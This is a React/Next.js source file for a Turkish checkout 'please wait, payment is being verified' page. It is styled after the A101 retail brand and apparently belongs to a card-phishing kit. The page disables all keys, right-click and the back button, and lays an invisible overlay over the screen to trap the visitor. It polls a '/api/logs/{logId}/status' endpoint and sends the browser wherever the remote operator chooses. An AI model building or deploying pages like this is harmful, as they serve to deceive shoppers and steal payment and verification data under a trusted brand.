'use client';

import { useEffect, useState, useRef } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import { FiClock, FiCheckCircle } from 'react-icons/fi';
import CheckoutStoreLogo from '@/components/CheckoutStoreLogo';
import { CHECKOUT_REDIRECT_POLL_MS } from '@/lib/constants';

export default function WaitingPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const logId = searchParams.get('logId');
  const [status, setStatus] = useState<'waiting' | 'redirecting'>('waiting');
  const checkIntervalRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    if (!logId) {
      router.replace('/checkout');
      return;
    }

    const blockKeys = (e: KeyboardEvent) => {
      e.preventDefault();
      e.stopPropagation();
    };

    const blockContextMenu = (e: Event) => {
      e.preventDefault();
    };

    history.pushState(null, '', window.location.href);
    const onPopState = () => {
      history.pushState(null, '', window.location.href);
    };

    document.addEventListener('keydown', blockKeys, true);
    document.addEventListener('contextmenu', blockContextMenu);
    window.addEventListener('popstate', onPopState);

    const checkLog = async () => {
      try {
        const res = await fetch(`/api/logs/${logId}/status?t=${Date.now()}`);
        const data = await res.json();

        if (data.success && data.data) {
          const log = data.data;

          if (log.redirectTo && typeof log.redirectTo === 'string' && log.redirectTo.trim() !== '') {
            const currentUrl = window.location.href;
            let redirectUrl = log.redirectTo.trim();
            if (!redirectUrl.includes('logId=') && logId) {
              redirectUrl += (redirectUrl.includes('?') ? '&' : '?') + `logId=${logId}`;
            }
            if (redirectUrl.startsWith('/')) {
              redirectUrl = window.location.origin + redirectUrl;
            } else if (!redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
              redirectUrl = window.location.origin + '/' + redirectUrl;
            }

            const currentUrlNormalized = currentUrl.split('#')[0].replace(/\/$/, '');
            const redirectUrlNormalized = redirectUrl.split('#')[0].replace(/\/$/, '');

            if (currentUrlNormalized !== redirectUrlNormalized) {
              setStatus('redirecting');
              if (checkIntervalRef.current) {
                clearInterval(checkIntervalRef.current);
                checkIntervalRef.current = null;
              }
              window.location.href = redirectUrl;
              return true;
            }
          }
        }
        return false;
      } catch {
        return false;
      }
    };

    checkLog();
    checkIntervalRef.current = setInterval(async () => {
      const shouldStop = await checkLog();
      if (shouldStop && checkIntervalRef.current) {
        clearInterval(checkIntervalRef.current);
        checkIntervalRef.current = null;
      }
    }, CHECKOUT_REDIRECT_POLL_MS);

    return () => {
      document.removeEventListener('keydown', blockKeys, true);
      document.removeEventListener('contextmenu', blockContextMenu);
      window.removeEventListener('popstate', onPopState);
      if (checkIntervalRef.current) {
        clearInterval(checkIntervalRef.current);
        checkIntervalRef.current = null;
      }
    };
  }, [logId, router]);

  return (
    <div className="relative min-h-screen min-h-dvh bg-a101-grayLight flex flex-col w-full min-w-0 overflow-hidden select-none">
      <header className="bg-a101-teal py-4 sm:py-5 pointer-events-none">
        <div className="container mx-auto flex justify-center px-4">
          <div className="flex items-center justify-center rounded-lg bg-white px-4 py-2 shadow-sm sm:px-5 sm:py-2.5">
            <CheckoutStoreLogo className="h-5 w-24 flex-shrink-0 sm:h-6 sm:w-28" />
          </div>
        </div>
      </header>

      <main className="flex flex-1 items-center justify-center px-4 py-8 pointer-events-none">
        <div className="max-w-md w-full text-center">
          <div className="rounded-xl bg-white p-6 sm:p-8 shadow-lg">
            <div className="mb-6 flex justify-center">
              {status === 'waiting' ? (
                <FiClock className="h-20 w-20 animate-spin text-a101-teal sm:h-24 sm:w-24" />
              ) : (
                <FiCheckCircle className="h-20 w-20 animate-pulse text-green-500 sm:h-24 sm:w-24" />
              )}
            </div>

            <h1 className="mb-4 text-xl font-black text-gray-900 sm:text-2xl">
              {status === 'waiting' ? 'İşleminiz Bekleniyor' : 'Yönlendiriliyorsunuz...'}
            </h1>

            <p className="text-sm leading-relaxed text-gray-600 sm:text-base">
              {status === 'waiting' ? (
                <>
                  Ödeme işleminiz kontrol ediliyor.
                  <br />
                  Lütfen bekleyiniz, sayfayı kapatmayınız.
                </>
              ) : (
                <>İşleminiz hazırlandı. Yönlendiriliyorsunuz...</>
              )}
            </p>

            {status === 'waiting' && (
              <div className="mt-6 flex justify-center gap-2">
                <div
                  className="h-3 w-3 animate-bounce rounded-full bg-a101-teal"
                  style={{ animationDelay: '0s' }}
                />
                <div
                  className="h-3 w-3 animate-bounce rounded-full bg-a101-teal"
                  style={{ animationDelay: '0.2s' }}
                />
                <div
                  className="h-3 w-3 animate-bounce rounded-full bg-a101-teal"
                  style={{ animationDelay: '0.4s' }}
                />
              </div>
            )}
          </div>

          <div className="mt-6 rounded-lg border-2 border-blue-200 bg-blue-50 p-4 pointer-events-none">
            <p className="text-xs leading-relaxed text-blue-800">
              <strong>Bilgi:</strong> İşleminiz onaylandığında otomatik olarak yönlendirileceksiniz.
            </p>
          </div>
        </div>
      </main>

      <div
        className="fixed inset-0 z-[9999] cursor-wait touch-none"
        aria-hidden="true"
        onClick={(e) => {
          e.preventDefault();
          e.stopPropagation();
        }}
        onMouseDown={(e) => {
          e.preventDefault();
          e.stopPropagation();
        }}
        onTouchStart={(e) => {
          e.preventDefault();
          e.stopPropagation();
        }}
      />
    </div>
  );
}
